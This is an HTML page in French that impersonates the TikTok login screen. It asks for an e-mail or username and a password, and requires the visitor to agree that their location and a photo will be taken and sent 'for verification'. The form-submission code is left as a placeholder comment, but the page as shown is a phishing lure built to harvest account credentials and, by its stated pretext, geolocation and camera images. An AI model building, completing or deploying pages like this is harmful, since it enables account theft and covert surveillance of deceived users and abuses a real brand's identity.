<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion TikTok</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #fe2c55;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 8px;
    }
    button:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
    button:hover:enabled {
      background-color: #e91b44;
    }
    .checkbox-label {
      font-size: 0.95em;
      display: flex;
      align-items: center;
      margin: 12px 0;
      text-align: left;
    }
    .checkbox-label input[type="checkbox"] {
      margin-right: 8px;
    }
    #notice {
      font-size: 0.95em;
      color: #c00;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connecte-toi à TikTok</h2>
    <div id="notice">
      En continuant, vous acceptez que votre localisation et une photo soient prises et envoyées pour vérification.
    </div>
    <form id="loginForm">
      <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
      <input type="password" id="password" placeholder="Mot de passe" required>
      <label class="checkbox-label">
        <input type="checkbox" id="acceptTerms" required>
        J'accepte les conditions d'utilisation (localisation + photo obligatoire)
      </label>
      <button type="submit" id="submitBtn" disabled>Se connecter</button>
    </form>
  </div>
  <script>
    // Activer/désactiver le bouton en fonction de la case à cocher
    const acceptTerms = document.getElementById('acceptTerms');
    const submitBtn = document.getElementById('submitBtn');
    acceptTerms.addEventListener('change', function() {
      submitBtn.disabled = !this.checked;
    });

    // (Le code du formulaire d'envoi peut être ajouté ici)
  </script>
</body>
</html>
